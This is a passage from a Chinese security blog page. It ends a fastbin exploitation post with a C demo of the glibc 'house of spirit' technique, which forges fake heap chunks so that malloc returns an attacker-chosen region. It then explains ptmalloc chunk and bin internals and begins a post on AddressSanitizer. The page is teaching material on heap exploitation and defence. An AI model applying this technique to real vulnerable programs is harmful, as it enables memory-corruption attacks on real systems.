class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  示例的结果如下图所示:</p>
<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/houseofspirit.png" alt="house of spirit"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/09/22/ptmalloc堆内存管理/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2017/09/22/ptmalloc堆内存管理/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">ptmalloc堆内存管理</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-09-22 20:11:38" itemprop="dateCreated datePublished" datetime="2017-09-22T20:11:38+08:00">2017-09-22</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/malloc/" itemprop="url" rel="index"><span itemprop="name">malloc</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>Linux的栈内存管理相信大家都已经很熟悉了，针对栈内存的攻击也是比较常见的。然而对于堆内存的管理机制可能不太熟悉，针对堆内存的攻击也是比较困难的，所以我通过阅读各种资料以及Glibc的相关源码，对Glibc下的堆内存管理机制有了一定的了解，故在此记录下学习心得。</p>
<p>首先不同平台的堆内存管理机制是不一样的，我现在主要是针对Glibc的堆内存管理机制进行分析，Glibc的堆内存管理机制叫做ptmalloc。其他的一些比较流行的管理机制有：</p>
<ol>
<li>jemalloc(FreeBSD, Firefox, Android)</li>
<li>ptmalloc(Glibc)</li>
<li>tcmalloc(Google)</li>
<li>libumem(Solaris)</li>
</ol>
<h2 id="Chunk-structure"><a href="#Chunk-structure" class="headerlink" title="Chunk structure"></a>Chunk structure</h2><p>在Glibc的堆内存管理中，chunk是堆内存分配的基本的单位，它表示堆内存中连续的内存单元。比方说我们通过malloc(8)申请一个连续的8字节内存，则Glibc会分配我们一个大小为8(chunk size + previous size)+8(payload)大小的chunk。chunk分为allocated chunk和freed chunk。chunk structure在Glibc的定义如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>从上面的结构我们可以看出，如果一个chunk为allocated chunk，则它需要分配prev_size和size域，其中prev_size和size(表示整个chunk的大小，包括sizeof(prev_size)+sizeof(size)+sizeof(payload))用来在进行free()操作的时候将与该chunk空间上相邻的freed chunk进行合并，减少了堆内存空间的碎片化（具体怎么合并的在下面会具体介绍）。如果一个chunk为freed chunk的话，其相对于allocated chunk来说又多了两个域–fd和bk指针。因为freed chunk是通过多个链表结构将所有的freed chunk链接了起来，这样便于malloc函数快速找到合适大小的freed chunk，并且该这些表是双向链表(fastbins除外)。</p>
<p>所以对于malloced chunk来说，具体的内存区域如下所示:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             prev_size:Size of previous chunk, <span class="keyword">if</span> allocated  | |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             User data starts here...                          .</span><br><span class="line">	    .                                                               .</span><br><span class="line">	    .             (malloc_usable_size() bytes)                      .</span><br><span class="line">	    .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of chunk                                     |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></p>
<p>在size域，有两个标志位，一个为M，一个为P。M表示该chunk是否是allocated chunk，P表示与该chunk空间上相邻的之前的chunk是否是freed chunk，如果该标识为0，表示previous chunk为freed chunk,则prev_size域表示previous chunk的大小; 否则如果previous chunk为allocated chunk，则记录previous chunk的大小就没有意义，此时就将prev_size域当做previous chunk的payload的一部分。</p>
<p>对于freed chunk来说，具体的内存区域如下所示:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of previous chunk                            |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `head:' |             Size of chunk, in bytes                         |P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Forward pointer to next chunk in <span class="built_in">list</span>             |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Back pointer to previous chunk in <span class="built_in">list</span>            |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Unused space (may be 0 bytes long)                .</span><br><span class="line">	    .                                                               .</span><br><span class="line">	    .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `foot:' |             Size of chunk, in bytes                           |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></p>
<p>对于freed chunk来说，就多了两个域：fd和bk，这两个域分别指向该链表中的前一个元素和后一个元素。</p>
<h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><p>在Glibc的堆内存管理中，bin是将一个个freed chunk链接起来的链表，而bins就是存储这些链表的一维数组。每一个bin都是双向链表。根据freed chunk的大小将其分为了不同的136个bin，其中有10个为fastbin, 62个small bin，63个large bin和一个unsorted bin。在malloc_state结构中，就定义了这些bin的数组，具体声明如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line">  <span class="comment">/* Statistics for locking.  Only used if THREAD_STATS is defined.  */</span></span><br><span class="line">  <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h3 id="Fast-Bins"><a href="#Fast-Bins" class="headerlink" title="Fast Bins"></a>Fast Bins</h3><p>在Glibc的堆内存管理机制中，一共有10个fast bin,每个fast bin链表中的所有freed chunk的大小(sizeof(prev_size)+sizeof(size)+sizeof(payload))都是相等的。每个fast bin都是一个单链表( )。Fastbins中最小的bin中的chunk大小为16字节，随后每个bin都增加8字节，所以最大的bin为80字节。需要注意的是，fast bin和其它的bin在free处理的时候有很大的不同，fast bin中的chunk的M标志都为1，因此在进行free处理的时候不进行freed chunk的合并操作(具体的合并操作在下文会具体介绍)。在每一个fast bin链表中，当有新的freed chunk需要插入时，会插入到该链表的尾部，删除也是从尾部删除，因此形成了一个先入后出(FILO)的策略。</p>
<h3 id="Small-Bins"><a href="#Small-Bins" class="headerlink" title="Small Bins"></a>Small Bins</h3><p>Small bin的个数为62个，每一个small bin是一些大小相等的freed chunk组成的循环双向链表。当有新的freed chunk加入到该链表中，就加入到该链表的头部；如果要从链表中删除一个freed chunk时，则从该链表的为尾部删除，因此形成了一个先入先出(FIFO)的策略。第一个small bin中的freed chunk的大小都是16 bytes，后面每一个small bin的freed chunk的大小都依次增加8 bytes，因此最后一个small bin的freed chunk的大小为512 bytes。</p>
<h3 id="Large-Bins"><a href="#Large-Bins" class="headerlink" title="Large Bins"></a>Large Bins</h3><p>与small bin和fast bin不同的是，每一个large bin中的freed chunk的大小不一定相等，其只是表示一个范围，在前32个large bin中，以64字节为步长，即第一个large bin中的chunk大小为512~575字节，第二个large bin中的free chunk大小为576~639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。</p>
<h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>只有一个unsorted sin，其主要存储两种chunk。一种是在malloc()操作中由于要分配的大小比freed chunk的大小要小，所以需要将该freed chunk进行分割，返回与要分配的大小相符的chunk，剩余的freed chunk则加入unsorted bin中；另一种是在free()操作之后，会返回一个新的freed chunk，该freed chunk(不在fast bin范围的chunk)则加入unsorted bin中。设置这一个bin的主要目的是扮演一个缓存层的角色以加快分配和释放的操作。</p>
<h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>有一个特殊的chunk没有在以上的bins中，那就是top chunk，top chunk可以看做是heap的一个边界，当所有的bin中的chunk大小都不符合所请求的大小时，就从该chunk中进行分配，如果top chunk的大小大于所请求的大小时，则将top chunk分为两部分，一个是用户请求的chunk，剩余的部分就会成为一个新的chunk。否则，就需要扩展通过上移top chunk指针来扩展heap的大小(或者通过mmap来分配新的heap)。</p>
<h2 id="Malloc"><a href="#Malloc" class="headerlink" title="Malloc"></a>Malloc</h2><p>malloc函数是堆内存管理中最重要的一个函数之一，其在glibc中的包装函数为__libc_malloc(size_t)函数，在该函数中主要是进行一些准备性的工作–查找对应的arena结构，然后调用真正的分配内存的函数 _int_malloc(ar_ptr, bytes)。arena在glibc中的结构为malloc_state结构，主要存储bins，top chunk等结构。下面我们来看一下主要的分配函数_int_malloc的具体实现。</p>
<p>_int_malloc (mstate av, size_t bytes)</p>
<ol>
<li><p>首先_int_malloc函数根据要请求的内存大小bytes来计算要请求的chunk的大小nb。主要是加上size和prev_size域和对齐的padding。</p>
</li>
<li><p>得到了要请求的chunk大小之后，首先判断该chunk的大小是否在fast bins的范围内，如果在它们的范围内就在fast bins中找到大小相符的chunk来分配。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/fastbin_malloc.png" alt="fast bin图片"></p>
</li>
<li><p>如果要请求的大小不在fast bins范围之内或者相应的fast bin链表为空，则会判断其chunk size是否在small bins的范围之内，找到对应的small bin，取出该small bin尾部的那个chunk进行分配。<br><img src="/2017/09/22/ptmalloc堆内存管理/smallbin_malloc.png" alt="small bin图片"></p>
</li>
<li><p>如果请求的大小是一个比较大的请求，则将fast bins进行合并。其要做fast bins合作的目的是为了避免有fast bins所引起的内存碎片化问题。在实际的操作中，程序一般都是分配小的内存或者分配大的内存，而不怎么会即分配大的内存又分配小的内存。所以这样的策略在实际的程序中效率还是很理想的。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/fastbin_consolidate.png" alt="fast bin合并图片"></p>
</li>
<li><p>由于unsorted bin中存储最近freed的chunk(包括第4步合并后的fast bins)，接下来会遍历unsorted bin中的所有freed chunk，直到找到freed chunk大小和请求的大小相等的为止，或者循环了10000次也会停止遍历unsorted bin。遍历unsorted bin是唯一一个将freed chunk插入到相应的small bins和large bins的操作。在遍历的过程中，将当前节点chunk从unsorted bin中删除，如果chunk大小与要请求的chunk大小正好一致，则将该chunk返回，停止遍历，否则，将当前节点的chunk放入相应的small bins和large bins中。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/unsortedbin_lastremainder.png" alt="unsorted bin last remainder图片"></p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/unsortedbin_insert.png" alt="unsorted bin insert图片"></p>
</li>
<li><p>遍历了unsorted bin之后仍然没有找到合适的freed chunk，接下来回从large bins中进行查找，首先从large bin中的chunk大于等于请求的chunk进行查找。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/largebin_find.png" alt="large bin find"></p>
<p>如果该large bin为空或者最大的chunk比要请求的chunk的大小还要小，则找到chunk size范围更大的large bin，进行的操作和刚才介绍的操作一致。</p>
</li>
<li><p>如果要请求的大小比large bins中的chunk还要大，则需要查看top chunk的大小了，如果top chunk的大小比要请求的chunk的大小要大，则分割top chunk，将剩余的chunk继续作为top chunk的一部分，否则判断是否还有fastbins，如果有fastbins，则将fastbins合并。以上各种查询都没有找到合适的chunk，则只能调用sysmalloc函数来进行分配。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/topchunk_malloc.png" alt="top chunk malloc"></p>
</li>
<li><p>至此，malloc的分配的过程已经介绍完了，总结一下其查找过程就是fastbins-&gt;smallbins-&gt;unsortedbins-&gt;largebins-&gt;topchunk</p>
</li>
</ol>
<h2 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h2><p>free函数也是堆内存管理中最重要的函数之一，堆内存的攻击也主要是针对free函数的进行的攻击。在glibc中，__libc_free(void<em> mem)为free(void</em> mem)函数的包装函数，其主要的功能也是找到malloc_state结构，然后再调用 _int_free(mstate av, mchunkptr p, int have_lock)函数。</p>
<ol>
<li><p>判断p指向的地址是否在p+chunksize(p)指向的地址之前，如果不符合该规则的话就会抛出错误(“free(): invalid pointer”)。</p>
</li>
<li><p>判断chunk的大小是否大于MINSIZE或者是不是MALLOC_ALIGNMENT的整数倍，否则抛出错误(“free(): invalid size”)</p>
</li>
<li><p>判断要free的chunk的大小是否落在了fast bins的范围内，如果落在了这个范围内，则将该freed chunk加入到对应的fast bin中。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/fastbin_free.png" alt="free chunk fastbin"></p>
</li>
<li><p>判断该chunk是否是mmapped，如果不是，就进行各种判断防止部分针对free操作的攻击。</p>
<ul>
<li>判断要free的chunk是否是top chunk，如果是，则抛出错误(“double free or corruption (top)”)</li>
<li>判断next chunk在内存中是否在arean的范围内，如果不是，则抛出错误(“double free or corruption (out)”)</li>
<li>判断next chunk的P标志是否为真，如果不是，则抛出错误(“double free or corruption (!prev)”)</li>
<li>判断next chunk的大小是否正常范围之间，如果不是，则抛出错误(“free(): invalid next size (normal)”)</li>
</ul>
<p><img src="/2017/09/22/ptmalloc堆内存管理/nomalfree_error.png" alt="normal free error"></p>
<p>然后将与free的chunk与其相邻的freed chunk进行合并，合并了之后将它插入到unsorted bin中。</p>
<p><img src="/2017/09/22/ptmalloc堆内存管理/normalfree.png" alt="normal free"></p>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/?spm=a313e.7916648.0.0.73affabdV5vocG" target="_blank" rel="noopener">Understanding glibc malloc</a></li>
<li><a href="https://www.gitbook.com/book/dhavalkapil/heap-exploitation/details" target="_blank" rel="noopener">heap-exploitation</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.Oqn9vN&amp;articleid=315" target="_blank" rel="noopener">Linux堆内存管理深入分析(上)</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.36f39d7ebNe83t&amp;articleid=334" target="_blank" rel="noopener">Linux堆内存管理深入分析(下)</a></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/07/26/AddressSanitizer/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2017/07/26/AddressSanitizer/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">AddressSanitizer算法及源码解析</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-07-26 10:03:38" itemprop="dateCreated datePublished" datetime="2017-07-26T10:03:38+08:00">2017-07-26</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:52" itemprop="dateModified" datetime="2018-12-23T13:33:52+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/LLVM/" itemprop="url" rel="index"><span itemprop="name">LLVM</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="AddressSanitizer简介"><a href="#AddressSanitizer简介" class="headerlink" title="AddressSanitizer简介"></a>AddressSanitizer简介</h2><p>AddressSanitizer是Google用于检测内存各种buffer overflow(Heap buffer overflow, Stack buffer overflow, Global buffer overflow)的一个非常有用的工具。该工具是一个LLVM的Pass，现已集成至llvm中，要是用它可以通过-fsanitizer=address选项使用它。AddressSanitizer的源码位于/lib/Transforms/Instrumentation/AddressSanitizer.cpp中，Runtime-library的源码在llvm的另一个项目compiler-rt的/lib/asan文件夹中。</p>
<h2 id="AddressSanitizer算法"><a href="#AddressSanitizer算法" class="headerlink" title="AddressSanitizer算法"></a>AddressSanitizer算法</h2><p>具体的算法可以参考<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm" target="_blank" rel="noopener">WIKI</a>,在此对AddressSanitizer算法做一个简短的介绍。AddressSanitizer主要包括两部分：插桩(Instrumentation)和动态运行库(Run-time library)。插桩主要是针对在llvm编译器级别对访问内存的操作(store，load，alloca等)，将它们进行处理。动态运行库主要提供一些运行时的复杂的功能(比如poison/unpoison shadow memory)以及将malloc,free等系统调用函数hook住。其实该算法的思路很简单，如果想防住Buffer Overflow漏洞，只需要在每块内存区域右端（或两端，能防overflow和underflow）加一块区域（RedZone），使RedZone的区域的影子内存（Shadow Memory)设置为不可写即可。具体的示意图如下图所示。</p>
<p><img src="/2017/07/26/AddressSanitizer/RedZone.png" alt="RedZone"></p>
<h3 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h3><p>AddressSanitizer保护的主要原理是对程序中的虚拟内存提供粗粒度的影子内存(没8个字节的内存对应一个字节的影子内存)，为了减少overhead，就采用了直接内存映射策略，所采用的具体策略如下：Shadow=(Mem &gt;&gt; 3) + offset。每8个字节的内存对应一个字节的影子内存，影子内存中每个字节存取一个数字k,如果k=0，则表示该影子内存对应的8个字节的内存都能访问，如果0&lt;k&lt;7,表示前k个字节可以访问，如果k为负数，不同的数字表示不同的错误（e.g. Stack buffer overflow, Heap buffer overflow)。具体的映射策略如下图所示。<br><img src="/2017/07/26/AddressSanitizer/mapping.png" alt="mapping图片"></p>
<center> 图1： 虚拟地址映射图 </center>

<p><img src="/2017/07/26/AddressSanitizer/typicalMapping.png" alt="typicalMapping"></p>
<h3 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h3><p>为了防止buffer overflow，需要将原来分配的内存两边分配额外的内存Redzone，并将这两边的内存加锁，设为不能访问状态，这样可以有效的防止buffer overflow(但不能杜绝buffer overflow)。一下是在栈中插桩的一个例子。</p>
<p>未插桩的代码：</p>
